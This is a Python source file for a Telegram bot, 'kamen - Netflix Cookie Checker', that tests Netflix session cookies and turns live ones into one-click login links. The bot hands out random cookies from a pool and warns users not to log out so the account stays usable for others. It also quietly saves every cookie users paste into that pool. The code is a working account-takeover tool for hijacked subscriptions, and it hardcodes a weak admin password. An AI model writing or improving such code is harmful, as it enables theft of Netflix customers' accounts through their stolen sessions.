import copy
import json
import logging
import os
import random
import threading
import time
from datetime import datetime, timezone, timedelta

import requests
from urllib3.exceptions import InsecureRequestWarning

from main import (
    extract_netflix_cookie_bundles,
    cookies_dict_from_netscape,
    has_required_netflix_cookies,
    get_account_page,
    extract_info,
    is_subscribed_account,
    is_on_hold_account,
    derive_plan_info,
    create_nftoken,
    build_nftoken_links,
    has_usable_nftoken,
    decode_netflix_value,
    move_cookie_with_reason,
    cookies_folder,
    failed_folder,
    broken_folder,
)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

API_BASE = "https://api.telegram.org/bot"
RETRYABLE_STATUS_CODES = {403, 429, 500, 502, 503, 504}
REQUEST_TIMEOUT = 15
NFTOKEN_RETRY_ATTEMPTS = 1

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

user_lang = {}
cooldowns = {}
awaiting_cookie = set()
awaiting_admin_password = set()
awaiting_broadcast = set()
admins = set()
ADMIN_PASSWORD = "1509"
COOLDOWN_SECONDS = 600
INDEX_FILE = "cookie_index.json"
DEFAULT_COOKIE_TYPE = "both"
admin_cookie_type = {}
awaiting_cookie_type = set()

USERS_FILE = "users.json"

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return []

def save_users(users):
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(list(dict.fromkeys(users)), f)
    except Exception as e:
        logger.warning(f"Failed to save users: {e}")

def add_user(chat_id):
    users = load_users()
    if chat_id not in users:
        users.append(chat_id)
        save_users(users)

LANG = {
    "en": {
        "menu": "🏠 Menu",
        "get_netflix_btn": "🎬 Get a Netflix",
        "paste_cookie_btn": "📋 I paste cookie myself",
        "send_cookie_prompt": "Send me your cookie text now.",
        "help_btn": "❓ Help",
        "about_btn": "ℹ️ About",
        "format_btn": "📋 Format",
        "guide_btn": "📱 Guide",
        "lang_btn": "🇮🇩 ID",
        "checking": "⏳ Checking cookie... Please wait.",
        "get_netflix_checking": "🎲 Picking a random cookie and checking...",
        "no_cookies_left": "💭 No cookies left in the pool.",
        "cookie_removed": "🗑️ Dead cookie removed from pool.",
        "cooldown": "⏳ Please wait {minutes}m {seconds}s before using this again.",
        "alive": "✅ Cookie is LIVE!",
        "dead": "❌ Cookie is dead, try another.",
        "plan": "📦 Plan",
        "country": "🌍 Country",
        "mobile_login": "📱 Mobile Login",
        "expires": "⏳ Token expires",
        "no_link": "⚠️ Could not generate mobile link: {err}",
        "start_msg": "🤖 <b>kamen - Netflix Cookie Checker</b>\n\nI check Netflix cookies and generate mobile login links.\n\n👇 Choose an option below:",
        "help_msg": "💬 <b>How to use</b>\n\n1. Get a Netflix cookie (Netscape .txt or JSON format)\n2. Paste it here as a message\n3. I'll check if it's valid\n4. If live, you get a mobile NFToken login link\n\n<b>Supported formats:</b>\n<code>.netflix.com\tTRUE\t/\tTRUE\t0\tNetflixId\txxx</code>\nor JSON array format.",
        "about_msg": "🤖 <b>kamen - Netflix Cookie Checker</b>\n\n✅ Checks Netflix cookies\n📱 Generates mobile NFToken login links\n🌐 Free 24/7 hosted on VPS\n\nJust send a cookie to get started!",
        "guide_msg": "📱 <b>How to use the mobile link</b>\n\n💻 <b>Android:</b>\n1. Clear Netflix app cache or delete app data\n2. Copy the generated login link\n3. Paste into default browser\n4. Auto login to Netflix\n\n📱 <b>iPhone / iPad:</b>\n1. Logout from previous Netflix app account\n2. Copy the generated login link\n3. Paste into default browser\n4. Auto login to Netflix app",
        "format_msg": "<b>Netscape format (.txt):</b>\n<code>.netflix.com\tTRUE\t/\tTRUE\t0\tNetflixId\tyourNetflixIdHere\n.netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\tyourSecureIdHere</code>\n\n<b>JSON format:</b>\n<code>[{\"domain\":\".netflix.com\",\"name\":\"NetflixId\",\"value\":\"xxx\"}]</code>\n\nJust copy and paste the whole thing here.",
        "cookie_text": "Cookie text:",
        "cookies_list_btn": "📂 List Cookies",
        "admin_btn": "🛡️ Admin",
        "enter_password": "🔑 Enter admin password:",
        "wrong_password": "❌ Wrong password.",
        "broadcast_prompt": "📢 Enter the broadcast message to send to all users:",
        "broadcast_sent": "✅ Broadcast sent to {count} users.",
        "broadcast_sending": "⏳ Broadcasting message to {count} users...",
        "language_set": "✅ Language set to English",
        "admin_panel_title": "🛡️ Admin Panel",
        "admin_select_type": "🎯 Select Cookie Type",
        "admin_basic_btn": "📦 Basic",
        "admin_premium_btn": "💰 Premium",
        "admin_both_btn": "🔄 Both (All)",
        "admin_back_btn": "« Back",
        "admin_main_menu_btn": "🏠 Main Menu",
        "admin_broadcast_btn": "📢 Broadcast",
        "admin_current_type": "Current cookie type: {type}",
        "admin_type_set": "✅ Cookie type set to {type}",
    },
    "id": {
        "menu": "🏠 Menu",
        "get_netflix_btn": "🎬 Ambil Netflix",
        "paste_cookie_btn": "📋 Saya paste cookie sendiri",
        "send_cookie_prompt": "Kirim teks cookie kamu sekarang.",
        "help_btn": "❓ Bantuan",
        "about_btn": "ℹ️ Tentang",
        "format_btn": "📋 Format",
        "guide_btn": "📱 Panduan",
        "lang_btn": "🇺🇸 EN",
        "checking": "⏳ Sedang memeriksa Cookie... Mohon tunggu.",
        "get_netflix_checking": "🎲 Sedang memilih cookie acak dan memeriksa...",
        "no_cookies_left": "💭 Tidak ada cookie tersisa di daftar.",
        "cookie_removed": "🗑️ Cookie mati telah dihapus dari daftar.",
        "cooldown": "⏳ Mohon tunggu {minutes} menit {seconds} detik sebelum menggunakan lagi.",
        "alive": "✅ Cookie masih LIVE!",
        "dead": "❌ Cookie sudah mati, silakan coba yang lain.",
        "plan": "📦 Paket",
        "country": "🌍 Negara",
        "mobile_login": "📱 Login via HP",
        "expires": "⏳ Kadaluarsa",
        "no_link": "⚠️ Tidak bisa membuat link: {err}",
        "start_msg": "🤖 <b>kamen - Netflix Cookie Checker</b>\n\nSaya memeriksa Netflix cookies dan membuat link login via HP.\n\n👇 Pilih opsi di bawah:",
        "help_msg": "💬 <b>Cara menggunakan</b>\n\n1. Ambil Netflix cookie (format Netscape .txt atau JSON)\n2. Paste di sini\n3. Saya akan memeriksa apakah masih aktif\n4. Jika masih aktif, kamu akan mendapatkan link login via HP\n\n<b>Format yang didukung:</b>\n<code>.netflix.com\tTRUE\t/\tTRUE\t0\tNetflixId\txxx</code>\natau JSON array.",
        "about_msg": "🤖 <b>kamen - Netflix Cookie Checker</b>\n\n✅ Memeriksa Netflix cookies\n📱 Membuat link login via HP\n🌐 Berjalan 24/7 di VPS\n\nCukup kirim cookie untuk memulai!",
        "guide_msg": "📱 <b>Cara menggunakan link HP</b>\n\n💻 <b>Android:</b>\n1. Bersihkan cache atau hapus data aplikasi Netflix\n2. Salin link yang dihasilkan\n3. Paste ke browser default\n4. Login Netflix secara otomatis\n\n📱 <b>iPhone / iPad:</b>\n1. Logout dari akun Netflix sebelumnya\n2. Salin link yang dihasilkan\n3. Paste ke browser default\n4. Login ke aplikasi Netflix secara otomatis",
        "format_msg": "<b>Format Netscape (.txt):</b>\n<code>.netflix.com\tTRUE\t/\tTRUE\t0\tNetflixId\tyourNetflixIdHere\n.netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\tyourSecureIdHere</code>\n\n<b>Format JSON:</b>\n<code>[{\"domain\":\".netflix.com\",\"name\":\"NetflixId\",\"value\":\"xxx\"}]</code>\n\nCukup salin dan paste di sini.",
        "cookie_text": "Teks Cookie:",
        "cookies_list_btn": "📂 List Cookies",
        "admin_btn": "🛡️ Admin",
        "enter_password": "🔑 Masukkan password admin:",
        "wrong_password": "❌ Password salah.",
        "broadcast_prompt": "📢 Masukkan pesan broadcast untuk dikirim ke semua user:",
        "broadcast_sent": "✅ Broadcast berhasil dikirim ke {count} user.",
        "broadcast_sending": "⏳ Sedang mengirim broadcast ke {count} user...",
        "language_set": "✅ Bahasa diganti ke Indonesia",
        "admin_panel_title": "🛡️ Panel Admin",
        "admin_select_type": "🎯 Pilih Tipe Cookie",
        "admin_basic_btn": "📦 Basic",
        "admin_premium_btn": "💰 Premium",
        "admin_both_btn": "🔄 Semua",
        "admin_back_btn": "« Kembali",
        "admin_main_menu_btn": "🏠 Menu",
        "admin_broadcast_btn": "📢 Broadcast",
        "admin_current_type": "Tipe Cookie saat ini: {type}",
        "admin_type_set": "✅ Tipe Cookie diatur ke {type}",
    },
}

def t(chat_id, key, **kwargs):
    lang = user_lang.get(chat_id, "id")  # Default bahasa Indonesia
    text = LANG.get(lang, LANG["id"]).get(key, key)
    if kwargs:
        text = text.format(**kwargs)
    return text

def detect_cookie_type(filename):
    name_lower = filename.lower()
    if "basic" in name_lower:
        return "basic"
    if "premium" in name_lower:
        return "premium"
    if "mobile" in name_lower:
        return "mobile"
    if "standard" in name_lower:
        return "standard"
    return "unknown"

def send_message(chat_id, text, parse_mode=None, keyboard=None):
    url = f"{API_BASE}{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
    if parse_mode:
        data["parse_mode"] = parse_mode
    if keyboard:
        data["reply_markup"] = json.dumps({"keyboard": keyboard, "resize_keyboard": True, "one_time_keyboard": False})
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        logger.warning(f"sendMessage failed: {e}")

COUNTRY_FULL_NAMES = {
    "IN": "INDIA", "US": "USA", "GB": "UK", "CA": "CANADA", "AU": "AUSTRALIA",
    "DE": "GERMANY", "FR": "FRANCE", "IT": "ITALY", "ES": "SPAIN", "PT": "PORTUGAL",
    "NL": "NETHERLANDS", "BE": "BELGIUM", "CH": "SWITZERLAND", "AT": "AUSTRIA",
    "SE": "SWEDEN", "NO": "NORWAY", "DK": "DENMARK", "FI": "FINLAND", "PL": "POLAND",
    "CZ": "CZECHIA", "SK": "SLOVAKIA", "HU": "HUNGARY", "RO": "ROMANIA", "BG": "BULGARIA",
    "GR": "GREECE", "HR": "CROATIA", "SI": "SLOVENIA", "LT": "LITHUANIA", "LV": "LATVIA",
    "EE": "ESTONIA", "IE": "IRELAND", "IS": "ICELAND", "LU": "LUXEMBOURG",
    "JP": "JAPAN", "KR": "SOUTH KOREA", "CN": "CHINA", "TW": "TAIWAN", "HK": "HONG KONG",
    "SG": "SINGAPORE", "MY": "MALAYSIA", "TH": "THAILAND", "VN": "VIETNAM",
    "PH": "PHILIPPINES", "ID": "INDONESIA", "IN": "INDIA", "LK": "SRI LANKA",
    "BD": "BANGLADESH", "PK": "PAKISTAN", "NP": "NEPAL", "MM": "MYANMAR",
    "AE": "UAE", "SA": "SAUDI ARABIA", "KW": "KUWAIT", "QA": "QATAR", "BH": "BAHRAIN",
    "OM": "OMAN", "JO": "JORDAN", "LB": "LEBANON", "IL": "ISRAEL", "TR": "TURKEY",
    "EG": "EGYPT", "ZA": "SOUTH AFRICA", "NG": "NIGERIA", "KE": "KENYA",
    "MA": "MOROCCO", "TN": "TUNISIA", "CI": "CÔTE D'IVOIRE", "GH": "GHANA",
    "AR": "ARGENTINA", "BR": "BRAZIL", "CL": "CHILE", "CO": "COLOMBIA",
    "MX": "MEXICO", "PE": "PERU", "EC": "ECUADOR", "UY": "URUGUAY",
    "RU": "RUSSIA", "UA": "UKRAINE", "KZ": "KAZAKHSTAN",
    "MO": "MACAU", "RE": "RÉUNION", "CV": "CAPE VERDE", "MD": "MOLDOVA",
    "BA": "BOSNIA", "AL": "ALBANIA", "MK": "NORTH MACEDONIA", "MT": "MALTA",
    "PR": "PUERTO RICO", "DO": "DOMINICAN REPUBLIC", "CR": "COSTA RICA",
    "PA": "PANAMA", "GT": "GUATEMALA", "SV": "EL SALVADOR", "HN": "HONDURAS",
    "BO": "BOLIVIA", "PY": "PARAGUAY", "TT": "TRINIDAD AND TOBAGO",
    "JM": "JAMAICA", "BS": "BAHAMAS", "BB": "BARBADOS",
    "ZW": "ZIMBABWE", "ZM": "ZAMBIA", "MW": "MALAWI", "MZ": "MOZAMBIQUE",
    "AO": "ANGOLA", "UG": "UGANDA", "TZ": "TANZANIA", "ET": "ETHIOPIA",
    "SN": "SENEGAL", "CM": "CAMEROON", "BI": "BURUNDI", "RW": "RWANDA",
    "AZ": "AZERBAIJAN", "GE": "GEORGIA", "AM": "ARMENIA", "UZ": "UZBEKISTAN",
    "BY": "BELARUS", "RS": "SERBIA", "ME": "MONTENEGRO", "XK": "KOSOVO",
    "NZ": "NEW ZEALAND", "PG": "PAPUA NEW GUINEA", "FJ": "FIJI",
}

def full_country_name(code):
    if not code:
        return "??"
    upper = code.strip().upper()
    return COUNTRY_FULL_NAMES.get(upper, upper)

def format_expiry_cambodia(utc_str):
    if not utc_str:
        return None
    try:
        utc_dt = datetime.strptime(utc_str.replace(" UTC", ""), "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        kh_dt = utc_dt + timedelta(hours=7)
        return kh_dt.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return utc_str

def _extract_earliest_expiry(filepath):
    earliest = None
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                parts = line.strip().split("\t")
                if len(parts) >= 7 and parts[5] in ("NetflixId", "SecureNetflixId"):
                    try:
                        exp = int(float(parts[4]))
                        if exp > 0 and (earliest is None or exp < earliest):
                            earliest = exp
                    except (ValueError, IndexError):
                        pass
    except Exception:
        pass
    return earliest if earliest is not None else 0

def build_cookie_index():
    cookie_dir = cookies_folder
    if not os.path.exists(cookie_dir):
        return {}
    index = {}
    for fname in os.listdir(cookie_dir):
        if not fname.lower().endswith(".txt"):
            continue
        filepath = os.path.join(cookie_dir, fname)
        index[fname] = _extract_earliest_expiry(filepath)
    _save_index(index)
    return index

def _save_index(index):
    try:
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(index, f, separators=(",", ":"))
    except Exception as e:
        logger.warning(f"Failed to save cookie index: {e}")

def _load_index():
    if not os.path.exists(INDEX_FILE):
        return None
    try:
        with open(INDEX_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None

def get_sorted_cookie_files():
    cookie_dir = cookies_folder
    if not os.path.exists(cookie_dir):
        return []

    current = {f for f in os.listdir(cookie_dir) if f.lower().endswith(".txt")}
    if not current:
        return []

    index = _load_index()
    if index is None:
        index = build_cookie_index()
    else:
        stale = set(index.keys()) - current
        if stale:
            for k in stale:
                del index[k]
        new = current - set(index.keys())
        if new:
            for fname in new:
                filepath = os.path.join(cookie_dir, fname)
                index[fname] = _extract_earliest_expiry(filepath)
        if stale or new:
            _save_index(index)

    sorted_files = sorted(current, key=lambda f: (
        1 if index.get(f, 0) == 0 else 0,
        index.get(f, 0) or 0,
        f,
    ))
    return sorted_files

def check_single_cookie(cookie_text):
    bundles = extract_netflix_cookie_bundles(cookie_text)
    if not bundles:
        return {"ok": False, "error": "No Netflix cookies found in the text."}

    bundle = bundles[0]
    netscape_content = bundle.get("netscape_text", "")
    cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_content)

    if not cookies or not has_required_netflix_cookies(cookies):
        return {"ok": False, "error": "Missing required NetflixId cookie."}

    session = requests.Session()
    session.cookies.update(cookies)

    for _ in range(2):
        try:
            response_text, status_code, extracted_info = get_account_page(
                session,
                proxy=None,
                request_timeout=REQUEST_TIMEOUT,
                fallback_account_page=True,
            )
            if status_code == 200 and response_text:
                break
            if status_code in RETRYABLE_STATUS_CODES:
                continue
            break
        except requests.exceptions.Timeout:
            return {"ok": False, "error": "Request timed out. Try again."}
        except requests.exceptions.RequestException as e:
            return {"ok": False, "error": f"Network error: {e}"}
    else:
        status_code = 0

    if status_code != 200 or not response_text:
        return {"ok": False, "error": "Cookie is dead or invalid."}

    info = extracted_info or extract_info(response_text)
    country = decode_netflix_value(info.get("countryOfSignup"))

    if not country:
        return {"ok": False, "error": "Cookie is dead or invalid."}

    is_subscribed = is_subscribed_account(info)
    plan_key, plan_label = derive_plan_info(info, is_subscribed)

    if not is_subscribed:
        return {"ok": False, "error": f"Cookie is free ({plan_label}). No active subscription."}

    on_hold = is_on_hold_account(info)
    if on_hold:
        return {"ok": False, "error": f"Account is on hold ({plan_label})."}

    nftoken_data, nftoken_error = create_nftoken(cookies, NFTOKEN_RETRY_ATTEMPTS)
    if not nftoken_data or not has_usable_nftoken(nftoken_data):
        return {
            "ok": True,
            "plan": plan_label,
            "country": country,
            "nftoken_error": nftoken_error or "NFToken unavailable",
            "mobile_link": None,
        }

    links = build_nftoken_links(nftoken_data["token"], "both")
    mobile_link = next((url for label, url in links if "Phone" in label), None)
    pc_link = next((url for label, url in links if "PC" in label), None)

    return {
        "ok": True,
        "plan": plan_label,
        "country": country,
        "mobile_link": mobile_link,
        "pc_link": pc_link,
        "expires": nftoken_data.get("expires_at_utc"),
    }

def get_random_cookie_and_check(cookie_type=None):
    cookie_dir = cookies_folder
    if not os.path.exists(cookie_dir):
        return {"ok": False, "error": "No cookies folder found."}

    tried = set()

    while True:
        sorted_files = get_sorted_cookie_files()
        available = [f for f in sorted_files if f not in tried]

        if cookie_type and cookie_type != "both":
            available = [f for f in available if detect_cookie_type(f) == cookie_type]

        if not available:
            return {"ok": False, "error": "No cookies available in the pool."}

        cookie_file = random.choice(available)
        tried.add(cookie_file)
        file_path = os.path.join(cookie_dir, cookie_file)

        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as e:
            move_cookie_with_reason(file_path, broken_folder, cookie_file, "file read error")
            continue

        result = check_single_cookie(content)
        result["file"] = cookie_file

        if not result["ok"]:
            error_reason = result.get("error", "dead")
            if any(t in error_reason.lower() for t in ("timeout", "network", "error", "equest")):
                move_cookie_with_reason(file_path, broken_folder, cookie_file, error_reason)
            else:
                move_cookie_with_reason(file_path, failed_folder, cookie_file, error_reason)
            continue

        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            logger.warning(f"Failed to remove used cookie {cookie_file}: {e}")

        return result

def save_cookie_to_file(cookie_text, chat_id):
    """Save pasted cookie text to cookies/ folder as .txt file."""
    try:
        os.makedirs(cookies_folder, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"cookie_{chat_id}_{timestamp}.txt"
        filepath = os.path.join(cookies_folder, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(cookie_text.strip())
        logger.info(f"Saved cookie to {filepath}")
        return filename
    except Exception as e:
        logger.warning(f"Failed to save cookie: {e}")
        return None


def process_cookie_async(chat_id, text, user):
    # Auto-save cookie to cookies/ folder
    saved_file = save_cookie_to_file(text, chat_id)
    if saved_file:
        logger.info(f"Cookie auto-saved: {saved_file}")

    try:
        result_data = check_single_cookie(text)
    except Exception as e:
        logger.exception("Error checking cookie")
        send_message(chat_id, f"❌ Error: {e}")
        return

    if not result_data["ok"]:
        send_message(chat_id, f"{t(chat_id, 'dead')}\n\n{result_data['error']}")
        return

    plan = result_data.get("plan", "Unknown")
    country = full_country_name(result_data.get("country"))
    mobile_link = result_data.get("mobile_link")
    pc_link = result_data.get("pc_link")

    logout_warning = "\n\n⚠️ Jangan logout akun setelah masuk, logout akan membuat cookie mati untuk orang lain"

    if mobile_link or pc_link:
        msg_text = (
            f"{t(chat_id, 'alive')}\n"
            f"{t(chat_id, 'plan')}: {plan}\n"
            f"{t(chat_id, 'country')}: {country}\n"
        )
        if pc_link:
            msg_text += f'\n🖥️ PC Login: <a href="{pc_link}">Klik untuk Login</a>'
        if mobile_link:
            msg_text += f'\n📱 Mobile Login: <a href="{mobile_link}">Klik untuk Login</a>'
            msg_text += '\n⚠️ iOS: Link tidak bisa dibuka di Telegram. Salin dan buka di Safari.'
        msg_text += logout_warning
        expiry_kh = format_expiry_cambodia(result_data.get("expires"))
        if expiry_kh:
            msg_text += f"\n\n{t(chat_id, 'expires')}: {expiry_kh}"
    else:
        nftoken_err = result_data.get("nftoken_error", "Unknown error")
        escaped = text[:200].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        msg_text = (
            f"{t(chat_id, 'alive')} ({plan} | {country})\n"
            f"{t(chat_id, 'no_link', err=nftoken_err)}\n\n"
            f"{t(chat_id, 'cookie_text')}\n<code>{escaped}</code>"
        )

    send_message(chat_id, msg_text, parse_mode="HTML")

def send_broadcast(admin_chat_id, message_text):
    users = load_users()
    send_message(admin_chat_id, t(admin_chat_id, "broadcast_sending", count=len(users)))
    sent = 0
    for uid in users:
        try:
            send_message(uid, message_text, parse_mode="HTML")
            sent += 1
        except Exception as e:
            logger.warning(f"Broadcast failed to {uid}: {e}")
    send_message(admin_chat_id, t(admin_chat_id, "broadcast_sent", count=sent))

def process_get_netflix_async(chat_id):
    try:
        cookie_type = admin_cookie_type.get(chat_id, DEFAULT_COOKIE_TYPE) if chat_id in admins else None
        result_data = get_random_cookie_and_check(cookie_type)
    except Exception as e:
        logger.exception("Error in Get a Netflix")
        send_message(chat_id, f"❌ Error: {e}")
        return

    if not result_data["ok"]:
        cooldowns.pop(chat_id, None)
        send_message(chat_id, t(chat_id, "no_cookies_left"))
        return

    plan = result_data.get("plan", "Unknown")
    country = full_country_name(result_data.get("country"))
    mobile_link = result_data.get("mobile_link")
    pc_link = result_data.get("pc_link")

    logout_warning = "\n\n⚠️ Jangan logout akun setelah masuk, logout akan membuat cookie mati untuk orang lain"

    if mobile_link or pc_link:
        msg_text = (
            f"{t(chat_id, 'alive')}\n"
            f"{t(chat_id, 'plan')}: {plan}\n"
            f"{t(chat_id, 'country')}: {country}\n"
        )
        if pc_link:
            msg_text += f'\n🖥️ PC Login: <a href="{pc_link}">Klik untuk Login</a>'
        if mobile_link:
            msg_text += f'\n📱 Mobile Login: <a href="{mobile_link}">Klik untuk Login</a>'
            msg_text += '\n⚠️ iOS: Link tidak bisa dibuka di Telegram. Salin dan buka di Safari.'
        msg_text += logout_warning
        expiry_kh = format_expiry_cambodia(result_data.get("expires"))
        if expiry_kh:
            msg_text += f"\n\n{t(chat_id, 'expires')}: {expiry_kh}"
    else:
        nftoken_err = result_data.get("nftoken_error", "Unknown error")
        msg_text = (
            f"{t(chat_id, 'alive')} ({plan} | {country})\n"
            f"{t(chat_id, 'no_link', err=nftoken_err)}"
        )

    send_message(chat_id, msg_text, parse_mode="HTML")

def handle_message(msg):
    text = msg["text"].strip()
    chat_id = msg["chat"]["id"]
    user = msg["from"].get("first_name", "User")

    # Ganti bahasa
    if text == "/language" or text == "🇮🇩 ID" or text == "🇺🇸 EN":
        current = user_lang.get(chat_id, "id")
        new_lang = "en" if current == "id" else "id"
        user_lang[chat_id] = new_lang
        add_user(chat_id)
        send_message(chat_id, t(chat_id, "language_set"), keyboard=[
            [t(chat_id, "cookies_list_btn")],
            [t(chat_id, "get_netflix_btn")],
                        [t(chat_id, "paste_cookie_btn")],
                        [t(chat_id, "help_btn"), t(chat_id, "about_btn")],
                        [t(chat_id, "format_btn"), t(chat_id, "guide_btn")],
                        [t(chat_id, "lang_btn"), t(chat_id, "admin_btn")],
        ])
        return

    if text == "/start" or text == t(chat_id, "menu"):
        add_user(chat_id)
        for s in (awaiting_cookie, awaiting_admin_password, awaiting_broadcast):
            s.discard(chat_id)
        send_message(
            chat_id, t(chat_id, "start_msg"), parse_mode="HTML",
            keyboard=[
                [t(chat_id, "cookies_list_btn")],
                [t(chat_id, "get_netflix_btn")],
                            [t(chat_id, "paste_cookie_btn")],
                            [t(chat_id, "help_btn"), t(chat_id, "about_btn")],
                            [t(chat_id, "format_btn"), t(chat_id, "guide_btn")],
                            [t(chat_id, "lang_btn"), t(chat_id, "admin_btn")],
            ],
        )
        return

    if text == t(chat_id, "get_netflix_btn"):
        if chat_id not in admins:
            now = time.time()
            entry = cooldowns.get(chat_id)
            if entry:
                elapsed = now - entry["first_use"]
                if elapsed < COOLDOWN_SECONDS:
                    if entry["count"] >= 3:
                        remaining = int(COOLDOWN_SECONDS - elapsed)
                        minutes, seconds = divmod(remaining, 60)
                        send_message(chat_id, t(chat_id, "cooldown", minutes=minutes, seconds=seconds))
                        return
                    entry["count"] += 1
                else:
                    entry["first_use"] = now
                    entry["count"] = 1
            else:
                cooldowns[chat_id] = {"first_use": now, "count": 1}
        if chat_id in admins:
            cookie_type = admin_cookie_type.get(chat_id, DEFAULT_COOKIE_TYPE)
            type_msg = f" ({cookie_type.upper()})" if cookie_type != "both" else ""
            send_message(chat_id, f"{t(chat_id, 'get_netflix_checking')}{type_msg}")
        else:
            send_message(chat_id, t(chat_id, "get_netflix_checking"))
        threading.Thread(
            target=process_get_netflix_async,
            args=(chat_id,),
            daemon=True,
        ).start()
        return

    if text == t(chat_id, "paste_cookie_btn"):
        add_user(chat_id)
        awaiting_cookie.add(chat_id)
        send_message(chat_id, t(chat_id, "send_cookie_prompt"),
                     keyboard=[[t(chat_id, "menu")]])
        return

    if chat_id in awaiting_admin_password:
        awaiting_admin_password.discard(chat_id)
        if text == ADMIN_PASSWORD:
            admins.add(chat_id)
            admin_cookie_type[chat_id] = DEFAULT_COOKIE_TYPE
            send_message(chat_id,
                f"{t(chat_id, 'admin_panel_title')}\n{t(chat_id, 'admin_current_type', type=DEFAULT_COOKIE_TYPE.upper())}",
                keyboard=[
                    [t(chat_id, "admin_select_type")],
                    [t(chat_id, "admin_broadcast_btn")],
                    [t(chat_id, "admin_main_menu_btn")],
                ])
        else:
            send_message(chat_id, t(chat_id, "wrong_password"),
                         keyboard=[[t(chat_id, "menu")]])
        return

    if text == t(chat_id, "admin_select_type"):
        if chat_id not in admins:
            return
        current_type = admin_cookie_type.get(chat_id, DEFAULT_COOKIE_TYPE)
        send_message(chat_id, t(chat_id, "admin_current_type", type=current_type.upper()),
                     keyboard=[
                         [t(chat_id, "admin_basic_btn")],
                         [t(chat_id, "admin_premium_btn")],
                         [t(chat_id, "admin_both_btn")],
                         [t(chat_id, "admin_back_btn")],
                     ])
        return

    if text == t(chat_id, "admin_basic_btn") and chat_id in admins:
        admin_cookie_type[chat_id] = "basic"
        send_message(chat_id, t(chat_id, "admin_type_set", type="Basic"),
                     keyboard=[
                         [t(chat_id, "admin_select_type")],
                         [t(chat_id, "admin_broadcast_btn")],
                         [t(chat_id, "admin_main_menu_btn")],
                     ])
        return

    if text == t(chat_id, "admin_premium_btn") and chat_id in admins:
        admin_cookie_type[chat_id] = "premium"
        send_message(chat_id, t(chat_id, "admin_type_set", type="Premium"),
                     keyboard=[
                         [t(chat_id, "admin_select_type")],
                         [t(chat_id, "admin_broadcast_btn")],
                         [t(chat_id, "admin_main_menu_btn")],
                     ])
        return

    if text == t(chat_id, "admin_both_btn") and chat_id in admins:
        admin_cookie_type[chat_id] = "both"
        send_message(chat_id, t(chat_id, "admin_type_set", type="Both (All)"),
                     keyboard=[
                         [t(chat_id, "admin_select_type")],
                         [t(chat_id, "admin_broadcast_btn")],
                         [t(chat_id, "admin_main_menu_btn")],
                     ])
        return

    if text == t(chat_id, "admin_back_btn"):
        if chat_id not in admins:
            return
        current_type = admin_cookie_type.get(chat_id, DEFAULT_COOKIE_TYPE)
        send_message(chat_id,
            f"{t(chat_id, 'admin_panel_title')}\n{t(chat_id, 'admin_current_type', type=current_type.upper())}",
            keyboard=[
                [t(chat_id, "admin_select_type")],
                [t(chat_id, "admin_broadcast_btn")],
                [t(chat_id, "admin_main_menu_btn")],
            ])
        return

    if text == t(chat_id, "admin_main_menu_btn"):
        send_message(chat_id, t(chat_id, "start_msg"), parse_mode="HTML",
                     keyboard=[
                         [t(chat_id, "cookies_list_btn")],
                         [t(chat_id, "get_netflix_btn")],
                                     [t(chat_id, "paste_cookie_btn")],
                                     [t(chat_id, "help_btn"), t(chat_id, "about_btn")],
                                     [t(chat_id, "format_btn"), t(chat_id, "guide_btn")],
                                     [t(chat_id, "lang_btn"), t(chat_id, "admin_btn")],
                     ])
        return

    if text == t(chat_id, "admin_broadcast_btn"):
        if chat_id not in admins:
            return
        awaiting_broadcast.add(chat_id)
        send_message(chat_id, t(chat_id, "broadcast_prompt"),
                     keyboard=[[t(chat_id, "admin_back_btn")]])
        return

    if chat_id in awaiting_broadcast:
        awaiting_broadcast.discard(chat_id)
        threading.Thread(
            target=send_broadcast,
            args=(chat_id, text),
            daemon=True,
        ).start()
        return

    if text == t(chat_id, "admin_btn"):
        if chat_id in admins:
            current_type = admin_cookie_type.get(chat_id, DEFAULT_COOKIE_TYPE)
            send_message(chat_id,
                f"{t(chat_id, 'admin_panel_title')}\n{t(chat_id, 'admin_current_type', type=current_type.upper())}",
                keyboard=[
                    [t(chat_id, "admin_select_type")],
                    [t(chat_id, "admin_broadcast_btn")],
                    [t(chat_id, "admin_main_menu_btn")],
                ])
        else:
            awaiting_admin_password.add(chat_id)
            send_message(chat_id, t(chat_id, "enter_password"),
                         keyboard=[[t(chat_id, "menu")]])
        return

    if text == "/help" or text == t(chat_id, "help_btn"):
        send_message(chat_id, t(chat_id, "help_msg"), parse_mode="HTML",
                     keyboard=[[t(chat_id, "menu")]])
        return

    if text == "/about" or text == t(chat_id, "about_btn"):
        send_message(chat_id, t(chat_id, "about_msg"), parse_mode="HTML",
                     keyboard=[[t(chat_id, "menu")]])
        return

    if text == "/guide" or text == t(chat_id, "guide_btn"):
        send_message(chat_id, t(chat_id, "guide_msg"), parse_mode="HTML",
                     keyboard=[[t(chat_id, "menu")]])
        return

    if text == t(chat_id, "format_btn"):
        send_message(chat_id, t(chat_id, "format_msg"), parse_mode="HTML",
                     keyboard=[[t(chat_id, "menu")]])
        return

    if text == "/cookies" or text == t(chat_id, "cookies_list_btn"):
        add_user(chat_id)
